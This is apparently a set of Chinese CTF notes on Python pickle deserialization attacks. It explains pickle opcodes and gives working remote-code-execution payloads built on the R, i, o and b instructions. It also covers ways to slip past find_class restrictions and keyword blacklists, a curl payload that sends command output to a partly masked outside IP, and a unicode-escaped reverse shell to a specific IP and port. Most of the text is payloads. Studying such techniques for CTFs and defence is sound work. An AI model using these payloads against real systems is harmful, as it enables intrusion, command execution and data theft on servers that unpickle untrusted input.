b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' pickle3版本opcode示例： 原数据：abcd b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'\n\\x80：协议头声明，读取此字符串后，会再读取一个字节 \\x03：协议版本 \\x04\\x00\\x00\\x00：数据长度：4 abcd数据 q存储在栈顶的字符串长度 \\x00栈顶位置，一个字节 .数据截止 b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(Vname\\nVrxz\\nVgrade\\nVG2\\nub.'\nc：GLOBAL操作符，连续读取两个字符串，分别作为module和name，以\\n分割，然后把module.name压入栈。注意此操作符使用find_class函数，作用为从x模块找到y，且只能在y在x顶层情况下找到y )：将一个空的元组tuple压入当前栈 \\x81：从栈中先弹出一个元素，记为args；再弹出一个元素记为cls，接下来执行cls.__new__(cls,*arg)，然后把得到的内容压入栈。即弹出参数和类，利用这个参数实例化类。 }：将一个空dist压入栈 (：MARK操作符，load_mark；将当前栈作为一个list，压进前序栈；然后把当前栈清空。 V：读入字符串，以\\n结尾，压入栈。 u：调用pop_mark，记录当前栈为list，在load_mark结束后返回；弹出前序栈栈顶，用list覆盖前序栈。执行之后结果：arr=['name','rxz','grade','G2']，当前栈为__main__.Sudent类和空dict；拿到当前栈的末尾元素，必须为dict，两个一组读取arr里的元素，前者为key后者为value存入dict。得到{'name': 'rxz', 'grade': 'G2'}，现在栈里面有一个实例一个字典 b：将当前栈栈顶存进state，弹出；当前栈栈顶为inst，弹出；用state的值更新实例inst；压入栈。此处使用的方法为：如果inst有__setstate__方法，直接交给方法，否则把state中的字典合并到inst.__dict__ .：结束；最后得到的结果是__main__.Sudent，其name值为rxz，grade值是G2 t：寻找栈中的上一个mark，并组合之间的数据为元组 S：实例化一个字符串对象 pickle0版本部分opcode：\n更多参考\nb'Vabcd\\np0\\n.'\nV：unicode编码 p：将堆栈最上面的项目复制到memo中 使用pickletools将opcode转换为易于读取的形式\nimport pickletools data=b\"\\x80\\x03cbuiltins\\nexec\\nq\\x00X\\x13\\x00\\x00\\x00key1=b'1'\\nkey2=b'2'q\\x01\\x85q\\x02Rq\\x03.\" pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL 'builtins exec' 17: q BINPUT 0 19: X BINUNICODE \"key1=b'1'\\nkey2=b'2'\" 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 利用方法 linkR指令 link原理 link大多数题目利用__reduce__方法，其指令码为R，作用为：\n取栈顶元素为args，弹出 取栈顶为f，弹出 arg为参数，执行f，结果压入栈 此方法会在反序列化的时候执行，f会返回字符串或元组。\n选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数\nb'''cos system (S'whoami' tR.''' 利用此方法构造恶意字符串：\nclass Student(): def __init__(self): self.name = \"rxz\" self.grade = \"G2\" def __reduce__(self): return os.system, (\"ls /\",) a = pickle.dumps(Student(), protocol=3) 绕过方式 link 如果黑名单没禁全，尝试`platform.popen(cmd, mode=‘r’, bufsize=-1) 使用map class Exploit(object): def __reduce__(self): return map,(os.system,[\"ls\"]) i指令码 link b'''(S'whoami' ios system .''' 先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）。\n0: ( MARK 1: S STRING 'whoami' 11: i INST 'os system' (MARK at 0) 22: . STOP o指令码 link b'''(cos system S'whoami' o.''' 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）。\n0: ( MARK 1: c GLOBAL 'os system' 12: S STRING 'whoami' 22: o OBJ (MARK at 0) 23: . STOP c指令码 link原理 link class Student(): def __init__(self): self.name = \"rxz\" self.grade = \"G2\" def check(data): if b'R' in data: return 0 x = pickle.loads(data) if x != Student(blue.name,blue.grade): return 0 return 1 c指令码的作用是获取全局变量，故而可以通过替换rxz为blue.name即可 换成指令是cblue\\nname\\n。 原本是b'\\x80\\x03c__main__\\nStudent\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x03\\x00\\x00\\x00rxzq\\x04X\\x05\\x00\\x00\\x00gradeq\\x05X\\x02\\x00\\x00\\x00G2q\\x06ub.' 最后结果是b'\\x80\\x03c__main__\\nStudent\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00namecblue\\nname\\nq\\x04X\\x05\\x00\\x00\\x00gradeq\\x05X\\x02\\x00\\x00\\x00G2q\\x06ub.'\n绕过 link如果题目对c指令进行了限制，只允许包含__main__这一个模块，则可以使用变量覆盖。 通过此指令引入的变量，可以看作是原变量的引用，从栈上修改他，也会修改原变量。\n先通过__main__.blue引入这个module 然后把一个dict压入栈，内容为{'name': 'rua', 'grade': 'www'} 执行b指令，会改写__main__.blue.name和 __main__.blue.grade，因此两个变量的值都变为了预期值，后面再正常压入Student对象即可 结果： b'\\x80\\x03c__main__\\nblue\\n}(Vname\\nVrua\\nVgrade\\nVwww\\nub0c__main__\\nStudent\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.' b指令RCE link原理 link执行build时，当inst拥有__setstate__方法时，把state交给他处理，否则合并到元组内。 所以可以先用build写入{'__setstate__': os.system}，把对象的__setstate__变为os.system，接下来利用\"ls /\"再build对象，会执行__setstate__(\"ls /\")，从而达成RCE。 payload：b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.' 执行完代码后清空栈，再压入一个正常的类即可防止报错 payload：b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb0c__main__\\nStudent\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.'\n绕过 link针对重写find_class的，可以利用sys.module获取危险函数。 sys.module是一个全局字典，字典的键是模块名，值是模块本身。 所以可以通过get(sys.modules,\"moduleName\")获取危险模块。\nprint(sys.modules) # 输出全部模块 最终需要构造的payload是：builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command) 写成opcode：\nb'''cbuiltins getattr (cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tRS'eval' tR(S'__import__(\"os\").system(\"whoami\")' tR. ''' 其他 link 其他模块的load也可能触发pickle反序列化，如numpy.load()，使用numpy自身的数据失败后，可以尝试用pickle的格式导入。 即使代码里面没有import os，GLOBAL指令也会自动导入。 无回显时执行os.system('curl your_server/`ls / | base64`)即可在日志中查看结果。 payload: b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVcurl 47.***.***.105/`ls / | base64`\\nb.' 绕过各种限制的方式和jail一样 如双写\npk = pickle.dumps(yourobject) pk = pk.replace(b'os', b'ooss') 字符串拼接\nclass A(object): def __reduce__(self): return eval,(\"__import__('o'+'s').system('env |tee b')\",) 其他：\na = base64.b64decode(session.get('ser_data')).replace(b\"builtin\", b\"BuIltIn\").replace(b\"os\", b\"Os\").replace(b\"bytes\", b\"Bytes\") if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(\"R i o b is forbidden\") pickle.loads(base64.b64decode(session.get('ser_data'))) 检测的是a有无riob，但是运行时还是ser_data，利用o和s连用组成os，替换为Os绕过 反弹shell用到i，会被检测，所以用V，能识别unicode编码\nb'''(cos system V'\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0031\\u0033\\u0039\\u002e\\u0032\\u0032\\u0034\\u002e\\u0031\\u0033\\u0030\\u002e\\u0031\\u0038\\u0033\\u002f\\u0031\\u0030\\u0030\\u0030\\u0032\\u0020\\u0030\\u003e\\u0026\\u0031' os.''' 因为s的作用是从堆栈中弹出三个值，一个字典，一个键和值。键/值条目是添加到字典，它被推回到堆栈上，所以前面需要添加一个字典和一个键：\nb'''(S'ba' S'ss' dS'sdasda' (cos system V'\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0031\\u0033\\u0039\\u002e\\u0032\\u0032\\u0034\\u002e\\u0031\\u0033\\u0030\\u002e\\u0031\\u0038\\u0033\\u002f\\u0031\\u0030\\u0030\\u0030\\u0032\\u0020\\u0030\\u003e\\u0026\\u0031' os.''' 手写opcode link三种print的方法：\n# __import__(\"builtins\").print('a', 'b') R = b'''cbuiltins print (S'a' S'b' tR. ''' o = b'''(cbuiltins print S'a' S'b' o. ''' i = b'''(S'a' S'b' ibuiltins print . ''' 例：执行系统命令： builtins.getattr(builtins, 'eval')(\"__import__('os').system('pwd')\") 用到c指令导入的有builtins.getattr和builtins，但pickle不能直接获取builtins一级模块，所以builtins不能直接导入，需要用： builtins.getattr(builtins.dict, 'get')(builtins.globals(), 'builtins')获取。 组合得到： builtins.getattr(builtins.getattr(builtins.dict, 'get')(builtins.globals(), 'builtins'), 'eval')(\"__import__('os').system('pwd')\") 分层编写opcode： 最内层function(\"__import__('os').system('pwd')\")\nb'''( S'__import__('os').system('pwd')' o. ''' 然后是最外层的builtins.getattr\nb'''( /////// (cbuiltins getattr arg1 S'eval' o /////// S'__import__('os').system('pwd')' o. ''' 补全arg1，从内层开始`(builtins.globals(), ‘builtins’)\nb'''((cbuiltins getattr /////// (cbuiltins globals o S'builtins' /////// S'eval' o S'__import__('os').system('pwd')' o. ''' pickletools.dis(test) 最后是builtins.getattr(builtins.dict, 'get')\nb'''((cbuiltins getattr ( /////// (cbuiltins getattr cbuiltins dict S'get' o /////// (cbuiltins globals o S'builtins' o S'eval' o S'__import__('os').system('pwd')' o. ''' 最终payload：\nb'''((cbuiltins getattr ((cbuiltins getattr cbuiltins dict S'get' o(cbuiltins globals oS'builtins' oS'eval' oS'__import__('os').system('whoami')' o. ''' "
             }
         );
